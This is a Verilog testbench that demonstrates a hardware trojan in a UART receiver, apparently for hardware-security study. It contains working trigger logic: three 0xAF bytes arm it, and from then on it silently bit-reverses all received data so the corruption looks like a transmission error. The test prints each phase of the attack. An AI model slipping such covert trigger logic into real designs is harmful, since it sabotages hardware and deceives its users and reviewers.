`timescale 1ns / 1ps

module tb_uart_trojan;

// Clock and reset
reg clk;
reg rst;

// UART RX signals (simulated)
reg rx_stb;
reg [7:0] rx_data;

// Trojan state
reg [1:0] trigger_count;
reg trojan_active;

// Output to FIFO
wire [7:0] data_to_fifo;

// Test counter
integer test_num;

//===========================================
// Clock generation (100MHz)
//===========================================
initial begin
    clk = 0;
    forever #5 clk = ~clk;
end

//===========================================
// TROJAN LOGIC (from original design)
//===========================================
always @(posedge clk) begin
    if (rst) begin
        trigger_count <= 2'd0;
        trojan_active <= 1'b0;
    end else begin
        if (rx_stb && !trojan_active) begin
            if (rx_data == 8'hAF) begin
                if (trigger_count == 2'd2) begin
                    trigger_count <= 2'd3;
                    trojan_active <= 1'b1;
                end else begin
                    trigger_count <= trigger_count + 2'd1;
                end
            end else begin
                trigger_count <= 2'd0;
            end
        end
    end
end

// Bit reverse function
function [7:0] bit_reverse;
    input [7:0] data;
    begin
        bit_reverse[0] = data[7];
        bit_reverse[1] = data[6];
        bit_reverse[2] = data[5];
        bit_reverse[3] = data[4];
        bit_reverse[4] = data[3];
        bit_reverse[5] = data[2];
        bit_reverse[6] = data[1];
        bit_reverse[7] = data[0];
    end
endfunction

// Data mux: normal or reversed
assign data_to_fifo = trojan_active ? bit_reverse(rx_data) : rx_data;

//===========================================
// Task: Send byte to UART RX
//===========================================
task send_byte;
    input [7:0] data_in;
    begin
        @(posedge clk);
        rx_data = data_in;
        rx_stb = 1'b1;
        @(posedge clk);
        rx_stb = 1'b0;
        @(posedge clk);
    end
endtask

//===========================================
// Task: Display result
//===========================================
task display_result;
    input [7:0] sent;
    input [7:0] received;
    begin
        $display("  Test %0d: Sent=0x%h, Received=0x%h, Trojan=%b, Count=%0d", 
                 test_num, sent, received, trojan_active, trigger_count);
        test_num = test_num + 1;
    end
endtask

//===========================================
// Main Test Sequence
//===========================================
initial begin
    $display("\n");
    $display("============================================================");
    $display("  Hardware Trojan Testbench - UART Bit Reversal Attack");
    $display("============================================================");
    
    // Initialize
    rst = 1;
    rx_stb = 0;
    rx_data = 8'h00;
    test_num = 1;
    
    // Wait and release reset
    repeat(10) @(posedge clk);
    rst = 0;
    repeat(5) @(posedge clk);
    
    $display("\n[PHASE 1] Normal Operation - Before Trojan Activation");
    $display("------------------------------------------------------------");
    
    send_byte(8'h41); // 'A'
    display_result(8'h41, data_to_fifo);
    
    send_byte(8'h42); // 'B'
    display_result(8'h42, data_to_fifo);
    
    send_byte(8'h43); // 'C'
    display_result(8'h43, data_to_fifo);
    
    send_byte(8'h12);
    display_result(8'h12, data_to_fifo);
    
    send_byte(8'h34);
    display_result(8'h34, data_to_fifo);
    
    $display("\n[PHASE 2] Triggering Trojan - Send 0xAF three times");
    $display("------------------------------------------------------------");
    
    send_byte(8'hAF);
    $display("  Trigger 1/3: Sent=0x%h, Received=0x%h, Count=%0d", 
             8'hAF, data_to_fifo, trigger_count);
    
    send_byte(8'hAF);
    $display("  Trigger 2/3: Sent=0x%h, Received=0x%h, Count=%0d", 
             8'hAF, data_to_fifo, trigger_count);
    
    send_byte(8'hAF);
    $display("  Trigger 3/3: Sent=0x%h, Received=0x%h, Count=%0d", 
             8'hAF, data_to_fifo, trigger_count);
    $display("  >>> TROJAN ACTIVATED! <<<");
    
    $display("\n[PHASE 3] Malicious Operation - Data is Bit-Reversed");
    $display("------------------------------------------------------------");
    
    send_byte(8'h41); // 'A'
    display_result(8'h41, data_to_fifo);
    $display("       Binary: 01000001 -> %08b", data_to_fifo);
    
    send_byte(8'h42); // 'B'
    display_result(8'h42, data_to_fifo);
    $display("       Binary: 01000010 -> %08b", data_to_fifo);
    
    send_byte(8'hB2);
    display_result(8'hB2, data_to_fifo);
    $display("       Binary: 10110010 -> %08b (0x%h)", data_to_fifo, data_to_fifo);
    
    send_byte(8'h01);
    display_result(8'h01, data_to_fifo);
    $display("       Binary: 00000001 -> %08b (0x%h)", data_to_fifo, data_to_fifo);
    
    send_byte(8'h80);
    display_result(8'h80, data_to_fifo);
    $display("       Binary: 10000000 -> %08b (0x%h)", data_to_fifo, data_to_fifo);
    
    send_byte(8'hFF);
    display_result(8'hFF, data_to_fifo);
    $display("       Binary: 11111111 -> %08b", data_to_fifo);
    
    $display("\n[PHASE 4] Reset and Recovery");
    $display("------------------------------------------------------------");
    
    // Apply reset
    @(posedge clk);
    rst = 1;
    repeat(5) @(posedge clk);
    rst = 0;
    repeat(5) @(posedge clk);
    
    $display("  System reset applied.");
    $display("  Trojan status: Active=%b, Count=%0d", trojan_active, trigger_count);
    
    send_byte(8'hB2);
    display_result(8'hB2, data_to_fifo);
    $display("       Normal operation restored!");
    
    send_byte(8'h01);
    display_result(8'h01, data_to_fifo);
    
    // Summary
    $display("\n============================================================");
    $display("  Test Complete - Trojan Behavior Demonstrated");
    $display("============================================================");
    $display("  Trigger: Three 0xAF bytes");
    $display("  Payload: Bit reversal of all received data");
    $display("  Impact: Silent data corruption (looks like transmission error)");
    $display("============================================================\n");
    
    #100;
    $finish;
end

endmodule